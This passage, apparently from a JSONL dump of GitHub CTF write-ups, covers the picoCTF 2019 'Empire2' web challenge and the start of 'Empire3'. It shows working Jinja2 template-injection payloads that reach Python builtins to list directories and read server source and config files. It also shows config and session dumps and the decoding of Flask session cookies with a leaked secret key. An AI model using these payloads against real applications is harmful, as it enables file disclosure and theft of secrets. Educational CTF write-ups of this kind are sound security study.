'sqlalchemy.sql.selectable.HasPrefixes'>, <class 'sqlalchemy.sql.selectable.HasSuffixes'>, <class 'sqlalchemy.sql.selectable.HasCTE'>, <class 'sqlalchemy.event.registry._EventKey'>, <class 'sqlalchemy.event.attr._empty_collection'>, <class 'sqlalchemy.event.base._UnpickleDispatch'>, <class 'sqlalchemy.event.base._Dispatch'>, <class 'sqlalchemy.event.base.Events'>, <class 'sqlalchemy.event.base._JoinedDispatcher'>, <class 'sqlalchemy.event.base.dispatcher'>, <class 'sqlalchemy.sql.schema._NotAColumnExpr'>, <class 'sqlalchemy.sql.schema.ColumnCollectionMixin'>, <class 'sqlalchemy.sql.schema._SchemaTranslateMap'>, <class 'sqlalchemy.cprocessors.UnicodeResultProcessor'>, <class 'sqlalchemy.DecimalResultProcessor'>, <class 'sqlalchemy.sql.sqltypes._LookupExpressionAdapter'>, <class 'sqlalchemy.sql.sqltypes.Concatenable'>, <class 'sqlalchemy.sql.sqltypes.Indexable'>, <class 'sqlalchemy.sql.util._repr_base'>, <class 'sqlalchemy.sql.util.ColumnAdapter._IncludeExcludeMapping'>, <class 'sqlalchemy.sql.functions._FunctionGenerator'>, <class 'sqlalchemy.sql.compiler.Compiled'>, <class 'sqlalchemy.sql.compiler.TypeCompiler'>, <class 'sqlalchemy.sql.compiler.IdentifierPreparer'>, <class 'sqlalchemy.engine.interfaces.Dialect'>, <class 'sqlalchemy.engine.interfaces.CreateEnginePlugin'>, <class 'sqlalchemy.engine.interfaces.ExecutionContext'>, <class 'sqlalchemy.engine.interfaces.Connectable'>, <class 'sqlalchemy.engine.interfaces.ExceptionContext'>, <class 'sqlalchemy.interfaces.PoolListener'>, <class 'sqlalchemy.interfaces.ConnectionProxy'>, <class 'sqlalchemy.log.Identified'>, <class 'sqlalchemy.log.InstanceLogger'>, <class 'sqlalchemy.log.echo_property'>, <class 'sqlalchemy.engine.base.Transaction'>, <class 'sqlalchemy.engine.base.Engine._trans_ctx'>, <class 'sqlalchemy.engine.url.URL'>, <class 'sqlalchemy.pool.base._ConnDialect'>, <class 'sqlalchemy.pool.base._ConnectionRecord'>, <class 'sqlalchemy.pool.base._ConnectionFairy'>, <class 'sqlalchemy.util.queue.Queue'>, <class 'sqlalchemy.pool.dbapi_proxy._DBProxy'>, <class 'sqlalchemy.engine.strategies.EngineStrategy'>, <class 'sqlalchemy.cresultproxy.BaseRowProxy'>, <class 'sqlalchemy.engine.result.ResultMetaData'>, <class 'sqlalchemy.engine.result.ResultProxy'>, <class 'sqlalchemy.sql.naming.ConventionDict'>, <class 'sqlalchemy.engine.reflection.Inspector'>, <class 'sqlalchemy.orm.base.InspectionAttr'>, <class 'sqlalchemy.orm.base._MappedAttribute'>, <class 'sqlalchemy.orm.collections._PlainColumnGetter'>, <class 'sqlalchemy.orm.collections._SerializableColumnGetter'>, <class 'sqlalchemy.orm.collections._SerializableAttrGetter'>, <class 'sqlalchemy.orm.collections.collection'>, <class 'sqlalchemy.orm.collections.CollectionAdapter'>, <class 'sqlalchemy.orm.path_registry.PathRegistry'>, <class 'sqlalchemy.orm.interfaces.MapperOption'>, <class 'sqlalchemy.orm.interfaces.LoaderStrategy'>, <class 'sqlalchemy.orm.attributes.Event'>, <class 'sqlalchemy.orm.attributes.AttributeImpl'>, <class 'sqlalchemy.orm.state.AttributeState'>, <class 'sqlalchemy.orm.state.PendingCollection'>, <class 'sqlalchemy.orm.instrumentation._SerializeManager'>, <class 'sqlalchemy.orm.instrumentation.InstrumentationFactory'>, <class 'sqlalchemy.orm.util.AliasedClass'>, <class 'sqlalchemy.orm.strategy_options.loader_option'>, <class 'sqlalchemy.orm.loading.PostLoad'>, <class 'sqlalchemy.orm.deprecated_interfaces.MapperExtension'>, <class 'sqlalchemy.orm.deprecated_interfaces.SessionExtension'>, <class 'sqlalchemy.orm.deprecated_interfaces.AttributeExtension'>, <class 'sqlalchemy.orm.evaluator.EvaluatorCompiler'>, <class 'sqlalchemy.orm.persistence.BulkUD'>, <class 'sqlalchemy.orm.query.Query'>, <class 'sqlalchemy.orm.query._QueryEntity'>, <class 'sqlalchemy.orm.query.QueryContext'>, <class 'sqlalchemy.orm.unitofwork.UOWTransaction'>, <class 'sqlalchemy.orm.unitofwork.IterateMappersMixin'>, <class 'sqlalchemy.orm.unitofwork.PostSortRec'>, <class 'sqlalchemy.orm.dependency.DependencyProcessor'>, <class 'sqlalchemy.orm.relationships.JoinCondition'>, <class 'sqlalchemy.orm.relationships._ColInAnnotations'>, <class 'sqlalchemy.orm.identity.IdentityMap'>, <class 'sqlalchemy.orm.session._SessionClassMethods'>, <class 'sqlalchemy.orm.session.SessionTransaction'>, <class 'sqlalchemy.orm.scoping.scoped_session'>, <class 'sqlalchemy.orm.strategies.LoadDeferredColumns'>, <class 'sqlalchemy.orm.strategies.LoadLazyAttribute'>, <class 'sqlalchemy.orm.strategies.SubqueryLoader._SubqCollections'>, <class 'sqlalchemy.orm.dynamic.AppenderMixin'>, <class 'sqlalchemy.orm.dynamic.CollectionHistory'>, <class 'sqlalchemy.orm.events._InstrumentationEventsHold'>, <class 'sqlalchemy.orm.events._EventsHold.HoldEvents'>, <class 'sqlalchemy.ext.baked.Bakery'>, <class 'sqlalchemy.ext.baked.BakedQuery'>, <class 'sqlalchemy.ext.baked.Result'>, <class 'sqlalchemy.ext.declarative.clsregistry._MultipleClassMarker'>, <class 'sqlalchemy.ext.declarative.clsregistry._ModuleMarker'>, <class 'sqlalchemy.ext.declarative.clsregistry._ModNS'>, <class 'sqlalchemy.ext.declarative.clsregistry._GetColumns'>, <class 'sqlalchemy.ext.declarative.clsregistry._GetTable'>, <class 'sqlalchemy.ext.declarative.clsregistry._class_resolver'>, <class 'sqlalchemy.ext.declarative.base._MapperConfig'>, <class 'sqlalchemy.ext.declarative.api.ConcreteBase'>, <class 'sqlalchemy.ext.declarative.api.DeferredReflection'>, <class 'flask_sqlalchemy.model.NameMetaMixin'>, <class 'flask_sqlalchemy.model.BindMetaMixin'>, <class 'flask_sqlalchemy.model.Model'>, <class 'flask_sqlalchemy._SessionSignalEvents'>, <class 'flask_sqlalchemy._EngineDebuggingSignalEvents'>, <class 'flask_sqlalchemy.Pagination'>, <class 'flask_sqlalchemy._QueryProperty'>, <class 'flask_sqlalchemy._EngineConnector'>, <class 'flask_sqlalchemy._SQLAlchemyState'>, <class 'flask_sqlalchemy.SQLAlchemy'>, <class 'flask_login.mixins.UserMixin'>, <class 'flask_login.mixins.AnonymousUserMixin'>, <class 'flask_login.login_manager.LoginManager'>, <class 'wtforms.validators.EqualTo'>, <class 'wtforms.validators.Length'>, <class 'wtforms.validators.NumberRange'>, <class 'wtforms.validators.Optional'>, <class 'wtforms.validators.DataRequired'>, <class 'wtforms.validators.InputRequired'>, <class 'wtforms.validators.Regexp'>, <class 'wtforms.validators.Email'>, <class 'wtforms.validators.IPAddress'>, <class 'wtforms.validators.UUID'>, <class 'wtforms.validators.AnyOf'>, <class 'wtforms.validators.NoneOf'>, <class 'wtforms.validators.HostnameValidation'>, <class 'wtforms.widgets.core.ListWidget'>, <class 'wtforms.widgets.core.TableWidget'>, <class 'wtforms.widgets.core.Input'>, <class 'wtforms.widgets.core.TextArea'>, <class 'wtforms.widgets.core.Select'>, <class 'wtforms.widgets.core.Option'>, <class 'wtforms.i18n.DefaultTranslations'>, <class 'wtforms.i18n.DummyTranslations'>, <class 'wtforms.utils.UnsetValue'>, <class 'wtforms.utils.WebobInputWrapper'>, <class 'wtforms.fields.core.Field'>, <class 'wtforms.fields.core.UnboundField'>, <class 'wtforms.fields.core.Flags'>, <class 'wtforms.fields.core.Label'>, <class 'wtforms.meta.DefaultMeta'>, <class 'wtforms.form.BaseForm'>, <class 'dominate.dom_tag.dom_tag'>, <class 'dominate.dom1core.dom1core'>, <class 'visitor.Visitor'>, <class 'flask_bootstrap.CDN'>, <class 'flask_bootstrap.StaticCDN'>, <class 'flask_bootstrap.WebCDN'>, <class 'flask_bootstrap.ConditionalCDN'>, <class 'flask_bootstrap.Bootstrap'>, <class 'zipfile.ZipInfo'>, <class 'zipfile._ZipDecrypter'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'pyexpat.xmlparser'>, <class 'plistlib.Data'>, <class 'plistlib._PlistParser'>, <class 'plistlib._DumbXMLWriter'>, <class 'plistlib._BinaryPlistParser'>, <class 'plistlib._BinaryPlistWriter'>, <class 'pkg_resources.extern.VendorImporter'>, <class 'pkg_resources._vendor.six._LazyDescr'>, <class 'pkg_resources._vendor.six._SixMetaPathImporter'>, <class 'pkg_resources._vendor.six._LazyDescr'>, <class 'pkg_resources._vendor.six._SixMetaPathImporter'>, <class 'pkg_resources._vendor.appdirs.AppDirs'>, <class 'pkg_resources.extern.packaging._structures.Infinity'>, <class 'pkg_resources.extern.packaging._structures.NegativeInfinity'>, <class 'pkg_resources.extern.packaging.version._BaseVersion'>, <class 'pkg_resources.extern.packaging.specifiers.BaseSpecifier'>, <class 'pkg_resources._vendor.pyparsing._Constants'>, <class 'pkg_resources._vendor.pyparsing._ParseResultsWithOffset'>, <class 'pkg_resources._vendor.pyparsing.ParseResults'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._FifoCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement'>, <class 'pkg_resources._vendor.pyparsing._NullToken'>, <class 'pkg_resources._vendor.pyparsing.OnlyOnce'>, <class 'pkg_resources._vendor.pyparsing.pyparsing_common'>, <class 'pkg_resources.extern.packaging.markers.Node'>, <class 'pkg_resources.extern.packaging.markers.Marker'>, <class 'pkg_resources.extern.packaging.requirements.Requirement'>, <class 'pkg_resources.IMetadataProvider'>, <class 'pkg_resources.WorkingSet'>, <class 'pkg_resources.Environment'>, <class 'pkg_resources.ResourceManager'>, <class 'pkg_resources.NullProvider'>, <class 'pkg_resources.NoDists'>, <class 'pkg_resources.EntryPoint'>, <class 'pkg_resources.Distribution'>, <class 'six._LazyDescr'>, <class 'six._SixMetaPathImporter'>, <class 'apscheduler.events.SchedulerEvent'>, <class 'apscheduler.executors.base.BaseExecutor'>, <class 'apscheduler.jobstores.base.BaseJobStore'>, <class 'apscheduler.util._Undefined'>, <class 'apscheduler.triggers.base.BaseTrigger'>, <class 'apscheduler.job.Job'>, <class 'apscheduler.schedulers.base.BaseScheduler'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>, <class 'wtforms.csrf.core.CSRF'>, <class 'flask_wtf.csrf.CSRFProtect'>, <class 'flask_wtf.recaptcha.widgets.RecaptchaWidget'>, <class 'flask_wtf.recaptcha.validators.Recaptcha'>, <class 'sqlalchemy.dialects.sqlite.json._FormatTypeMixin'>, <class 'sqlalchemy.dialects.sqlite.base._DateTimeMixin'>, <class 'sqlite3.Row'>, <class 'sqlite3.Cursor'>, <class 'sqlite3.Connection'>, <class 'sqlite3Node'>, <class 'sqlite3.Cache'>, <class 'sqlite3.Statement'>, <class 'sqlite3.PrepareProtocol'>, <class 'unicodedata.UCD'>]\r\n\r\n(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('.')\r\nSending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('.')}}'\r\n\r\n['server.py', 'app', 'xinet_startup.sh']\r\n\r\n(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open']('server.py').read()\r\nSending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open']('server.py').read()}}'\r\n\r\nfrom app import app\r\nif __name__ == '__main__':\r\n    app.run()\r\n\r\n\r\n(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('app')\r\nSending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('app')}}'\r\n\r\n['templates', 'helpers.py', '__init__.py', 'config.py', 'models.py', 'routes.py']\r\n\r\n(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'config.py')).read()\r\nSending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'config.py')).read()}}'\r\n\r\n\r\nimport os\r\n\r\nbasedir = os.path.abspath(os.path.dirname(__file__))\r\n\r\nclass Config(object):\r\n    SECRET_KEY = 'picoCTF{your_flag_is_in_another_castle12345678}'\r\n    SQLALCHEMY_DATABASE_URI = 'sqlite://'\r\n    #SQLALCHEMY_DATABASE_URI = os.environ.get('DATABSE_URL') or 'sqlite:///'+os.path.join(basedir,'app.db')\r\n    SQLALCHEMY_TRACK_MODIFICATIONS = False\r\n\r\n(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', '__init__.py')).read()\r\nSending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', '__init__.py')).read()}}'\r\n\r\nfrom flask import Flask\r\nfrom app.config import Config\r\nfrom flask_sqlalchemy import SQLAlchemy\r\nfrom flask_login import LoginManager\r\nfrom flask_bootstrap import Bootstrap\r\nimport time,atexit\r\nfrom apscheduler.schedulers.background import BackgroundScheduler\r\n\r\napp = Flask(__name__)\r\napp.config.from_object(Config)\r\ndb = SQLAlchemy(app)\r\nlogin = LoginManager(app)\r\nlogin.login_view = 'login'\r\nbootstrap=Bootstrap(app)\r\n\r\nfrom app import routes,models\r\n\r\ndef DB_init(db):\r\n    db.drop_all()\r\n    db.create_all()\r\n\r\n    u = models.User(username='jarrett.booz',password_hash='deadbeef',id=1,admin=0,secret='Likes Oreos.', name=\"Jarrett Booz\")\r\n    db.session.add(u)\r\n\r\n    u = models.User(username='danny.tunitis',password_hash='deadbeef',id=2,admin=0,secret='Know it all.', name= \"Danny Tunitis\")\r\n    db.session.add(u)\r\n\r\n    c = models.Todo(item='Shrink the moon', user_id=1)\r\n    db.session.add(c)\r\n\r\n    c = models.Todo(item='Grab the moon', user_id=1)\r\n    db.session.add(c)\r\n\r\n    c = models.Todo(item='Sit on the toilet', user_id=1)\r\n    db.session.add(c)\r\n\r\n    db.session.commit()\r\n\r\ntry:\r\n    DB_init(db)\r\n    scheduler = BackgroundScheduler()\r\n    scheduler.add_job(func=DB_init,args=(db,),trigger=\"interval\",hours=2)\r\n    scheduler.start()\r\n    atexit.register(lambda: scheduler.shutdown())\r\nexcept Exception as e:\r\n    print(e)\r\n\r\n(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'models.py')).read()\r\nSending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'models.py')).read()}}'\r\n\r\nfrom app import db,login\r\nfrom werkzeug.security import generate_password_hash,check_password_hash\r\nfrom flask_login import UserMixin\r\n\r\n@login.user_loader\r\ndef load_user(id):\r\n    return User.query.get(int(id))\r\n\r\nclass User(UserMixin, db.Model):\r\n    id = db.Column(db.Integer, primary_key=True)\r\n    username = db.Column(db.String(64),index=True,unique=True)\r\n    name = db.Column(db.String(128))\r\n    password_hash = db.Column(db.String(128))\r\n    secret = db.Column(db.String(128),default=\"picoCTF{its_a_me_your_flag5c0e0ae8}\")\r\n    admin = db.Column(db.Integer,default=0)\r\n\r\n    def set_password(self,password):\r\n        self.password_hash = generate_password_hash(password)\r\n\r\n    def check_password(self,password):\r\n        return check_password_hash(self.password_hash,password)\r\n\r\n    def __repr__(self):\r\n        return '<User {}>'.format(self.username)\r\n\r\n\r\nclass Todo(db.Model):\r\n    id = db.Column(db.Integer,primary_key=True)\r\n    item = db.Column(db.String(256))\r\n    user_id = db.Column(db.Integer,db.ForeignKey('user.id'))\r\n\r\n    def __repr__(self):\r\n        return '<Todo {}>'.format(self.id)\r\n\r\n\r\n```\r\n\r\nWe can see that the flag is located in the source of `models.py`: `picoCTF{its_a_me_your_flag5c0e0ae8}`. Since it is inserted into the DB, this might be an unintended solution.\r\n\r\n## Additional Solutions\r\n\r\nTwo more ways to solve the challenge, based on other writeups:\r\n\r\n#### Session\r\n\r\nThe flag is in the user session ([source](https://github.com/roothuntervn/CTF-Writeup/blob/e85042ca05eede0591841c8da6e3f4af2f0b47a3/picoCTF-2019/Web/empire-2/README.md)):\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire2# python shell.py\r\nLogged in\r\n(Cmd) send session\r\nSending: '{{session}}'\r\n\r\n<SecureCookieSession {'_fresh': True, '_id': '3898c6835dcd0270702e6730af6bfe5706c798e5239b48c704db909659fbfba4610afd8be05b0a827eda02cb65fe7dc75a2f84325654bddbbbc922a3c5e4f79d', 'csrf_token': '4eff1dd062289b5e4144c3a136d6516ac2430ad9', 'dark_secret': 'picoCTF{its_a_me_your_flag5c0e0ae8}', 'user_id': '3'}>\r\n\r\n(Cmd)\r\n```\r\n\r\n#### Flask Cookie\r\n\r\nWe can decode the cookie with the secret key ([source](http://cyberchallenge.unica.it/index.php/2019/10/13/web-empire2/)). This is probably the intended solution.\r\n\r\nWe dump the config:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire2# python shell.py\r\nLogged in\r\n(Cmd) send config\r\nSending: '{{config}}'\r\n\r\n<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'picoCTF{your_flag_is_in_another_castle12345678}', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}, 'BOOTSTRAP_USE_MINIFIED': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None}>\r\n```\r\n\r\nThe secret key is:\r\n```\r\n'SECRET_KEY': 'picoCTF{your_flag_is_in_another_castle12345678}'\r\n```\r\n\r\nNow we fetch the cookie:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire2# curl \"https://2019shell1.picoctf.com/problem/13253/login\" --cookie \"cookies.txt\" --cookie-jar \"cookies.txt\" -s -v --data \"csrf_token=$(curl \"https://2019shell1.picoctf.com/problem/13253/login\" --cookie \"cookies.txt\" --cookie-jar \"cookies.txt\" -s | grep csrf | awk '{ printf $5 }' | sed 's/value=\"//g' | sed 's/\">//')&username=user&password=password\" 2>&1 | grep Cookie\r\n> Cookie: session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiZDU1MzkwODhkZGNhY2Y4NmZmZDYzYjJlNWIyZTJkMWVhOGM3YjUxNiJ9.XaWvuQ.O3jA4KKsTj0ZUrOcDxKxY29EIng\r\n< Vary: Cookie\r\n< Set-Cookie: session=.eJwljzlqA0EUBe_SsYJe_qrLiP4bNgYbZqTI-O4acPDCour9tkcdeX60-_N45a09PqPdm0KV7kWJyMEbnDNCycmhVKX3jh25g1lZmuCetFXZcuiMwQTTRPrwpZGFq88xEFYIb9YSJQAunZgbFJzQISZOBzaiUWC73ZqfRz2eP1_5ffUE4tIuEuHbS6gqaNlMvHYJc4uz4aCLe515_J9Y7e8NdkY-9w.XaWvvA.J1ZL5OMpkoGhBUIwKwNMh0Qxj_w; HttpOnly; Path=/\r\n```\r\n\r\nAnd try to decode it with [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager):\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire2# c=.eJwljzlqA0EUBe_SsYJe_qrLiP4bNgYbZqTI-O4acPDCour9tkcdeX60-_N45a09PqPdm0KV7kWJyMEbnDNCycmhVKX3jh25g1lZmuCetFXZcuiMwQTTRPrwpZGFq88xEFYIb9YSJQAunZgbFJzQISZOBzaiUWC73ZqfRz2eP1_5ffUE4tIuEuHbS6gqaNlMvHYJc4uz4aCLe515_J9Y7e8NdkY-9w.XaWvvA.J1ZL5OMpkoGhBUIwKwNMh0Qxj_w\r\nroot@kali:/media/sf_CTFs/pico/Empire2# python ~/utils/flask-session-cookie-manager/flask_session_cookie_manager2.py decode -s 'picoCTF{your_flag_is_in_another_castle12345678}' -c \"$c\"\r\n{u'csrf_token': u'd5539088ddcacf86ffd63b2e5b2e2d1ea8c7b516', u'_fresh': True, u'user_id': u'3', u'_id': u'94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba'}\r\n```\r\n\r\nNo flag yet. We try to add an item and then decode the new cookie:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire2# curl \"https://2019shell1.picoctf.com/problem/13253/add_item\" --cookie \"cookies.txt\" --cookie-jar \"cookies.txt\" -s -v --data \"csrf_token=$(curl \"https://2019shell1.picoctf.com/problem/13253/add_item\" --cookie \"cookies.txt\" --cookie-jar \"cookies.txt\" -s | grep csrf | awk '{ printf $5 }' | sed 's/value=\"//g' | sed 's/\">//')&item=test\" 2>&1 | grep Cookie\r\n> Cookie: session=.eJwljzlqA0EUBe_SsYJe_qrLiP4bNgYbZqTI-O4acPDCour9tkcdeX60-_N45a09PqPdm0KV7kWJyMEbnDNCycmhVKX3jh25g1lZmuCetFXZcuiMwQTTRPrwpZGFq88xEFYIb9YSJQAunZgbFJzQISZOBzaiUWC73ZqfRz2eP1_5ffUE4tIuEuHbS6gqaNlMvHYJc4uz4aCLe515_J9Y7e8NdkY-9w.XaWvvA.J1ZL5OMpkoGhBUIwKwNMh0Qxj_w\r\n< Vary: Cookie\r\n< Set-Cookie: session=.eJwlT0tqQzEQu0rwOgt_Zsae7LrsGUoI9nya0iaF55dVyN1r6EIIgYSkZ7j4T59Xm-H08QyHfVG42Zz908IxvO92O7ypmobz63xc5s3mNZz27WFLfWk4BQZ37oUMsWrtINVUmYQEnLnFGDFijTCGDxsNe6bOXIclzpoqQR6txSSF1RxLzCkhFG21V_bGBFCdM1oHBiEU0IxZoA6i5DD6milz88v--233tUcRC8fWVKWLN3JXKiMbLqxC603qwEQr95i2_Z8o4fUHY_tNeg.XaWweA.GMksoJhXdbLCFk4pNRiOwzFa-J8; HttpOnly; Path=/\r\nroot@kali:/media/sf_CTFs/pico/Empire2# c=.eJwlT0tqQzEQu0rwOgt_Zsae7LrsGUoI9nya0iaF55dVyN1r6EIIgYSkZ7j4T59Xm-H08QyHfVG42Zz908IxvO92O7ypmobz63xc5s3mNZz27WFLfWk4BQZ37oUMsWrtINVUmYQEnLnFGDFijTCGDxsNe6bOXIclzpoqQR6txSSF1RxLzCkhFG21V_bGBFCdM1oHBiEU0IxZoA6i5DD6milz88v--233tUcRC8fWVKWLN3JXKiMbLqxC603qwEQr95i2_Z8o4fUHY_tNeg.XaWweA.GMksoJhXdbLCFk4pNRiOwzFa-J8\r\nroot@kali:/media/sf_CTFs/pico/Empire2# python ~/utils/flask-session-cookie-manager/flask_session_cookie_manager2.py decode -s 'picoCTF{your_flag_is_in_another_castle12345678}' -c \"$c\"\r\n{u'_id': u'94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba', u'_fresh': True, u'user_id': u'3', u'csrf_token': u'd5539088ddcacf86ffd63b2e5b2e2d1ea8c7b516', u'_flashes': [(u'message', u'Item Added')]}\r\n```\r\n\r\nNo cookie yet. Maybe we need to list the items?\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire2# curl \"https://2019shell1.picoctf.com/problem/13253/list_items\" --cookie \"cookies.txt\" --cookie-jar \"cookies.txt\" -s -v 2>&1 | grep Cookie\r\n> Cookie: session=.eJwlT0tqQzEQu0rwOgt_Zsae7LrsGUoI9nya0iaF55dVyN1r6EIIgYSkZ7j4T59Xm-H08QyHfVG42Zz908IxvO92O7ypmobz63xc5s3mNZz27WFLfWk4BQZ37oUMsWrtINVUmYQEnLnFGDFijTCGDxsNe6bOXIclzpoqQR6txSSF1RxLzCkhFG21V_bGBFCdM1oHBiEU0IxZoA6i5DD6milz88v--233tUcRC8fWVKWLN3JXKiMbLqxC603qwEQr95i2_Z8o4fUHY_tNeg.XaWweA.GMksoJhXdbLCFk4pNRiOwzFa-J8\r\n< Vary: Cookie\r\n< Set-Cookie: session=.eJwlkL1qQzEMhV8leM7gP9lWtlIodO9WwkWW5CQkaYp9M5SQd69LB3EQnA-do4dZ2oXGUYfZfT7MZp1irjoGHdRszfuq182LiIrZP_fbae46jma39rvO7SRmZzC2hhSSAmTJFDmrCCZOHBtisdaChWxjra1qLUA-EWKu6tCLyyn6Wop1HFC0QbDeOYhBSqaMrWCKMTf0oBQxcgKO4sFzzDUl12KlGZNHb8t6O-vXzCMAAW0pIkzcSmpNUqheYc48qFQ4V3BpckL9vAzlrrO3-T7x7fXj7XFax0LLVZef273_vecAbNWSludk7kP7f_Fgnr8_qWAy.XaWwzw.3uQye2Z-VwJiYXfe6SBN2DGivGU; HttpOnly; Path=/\r\nroot@kali:/media/sf_CTFs/pico/Empire2# c=.eJwlkL1qQzEMhV8leM7gP9lWtlIodO9WwkWW5CQkaYp9M5SQd69LB3EQnA-do4dZ2oXGUYfZfT7MZp1irjoGHdRszfuq182LiIrZP_fbae46jma39rvO7SRmZzC2hhSSAmTJFDmrCCZOHBtisdaChWxjra1qLUA-EWKu6tCLyyn6Wop1HFC0QbDeOYhBSqaMrWCKMTf0oBQxcgKO4sFzzDUl12KlGZNHb8t6O-vXzCMAAW0pIkzcSmpNUqheYc48qFQ4V3BpckL9vAzlrrO3-T7x7fXj7XFax0LLVZef273_vecAbNWSludk7kP7f_Fgnr8_qWAy.XaWwzw.3uQye2Z-VwJiYXfe6SBN2DGivGU\r\nroot@kali:/media/sf_CTFs/pico/Empire2# python ~/utils/flask-session-cookie-manager/flask_session_cookie_manager2.py decode -s 'picoCTF{your_flag_is_in_another_castle12345678}' -c \"$c\"\r\n{u'csrf_token': u'd5539088ddcacf86ffd63b2e5b2e2d1ea8c7b516', u'user_id': u'3', u'_flashes': [(u'message', u'Item Added')], u'_fresh': True, u'dark_secret': u'picoCTF{its_a_me_your_flag5c0e0ae8}', u'_id': u'94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba'}\r\n```\r\n\r\nWe can finally see the flag using this method. Template injection was much easier :-)", "timestamp": "2025-10-21T13:36:25.810917"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Empire3.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Empire3.md", "content": "# Empire3\r\nWeb Exploitation, 500 points\r\n\r\n## Description:\r\n> Agent 513! One of your dastardly colleagues is laughing very sinisterly! Can you access his todo list and discover his nefarious plans?\r\n\r\n\r\n## Solution: \r\n\r\nThis is the follow-up for [Empire2](Empire2.md).\r\n\r\nWe'll use the same solution that worked for the previous challenge:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire3# python shell.py\r\nLogged in\r\n(Cmd) send 4*4\r\nSending: '{{4*4}}'\r\n\r\n16\r\n\r\n(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', '__init__.py')).read\r\n()\r\nSending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 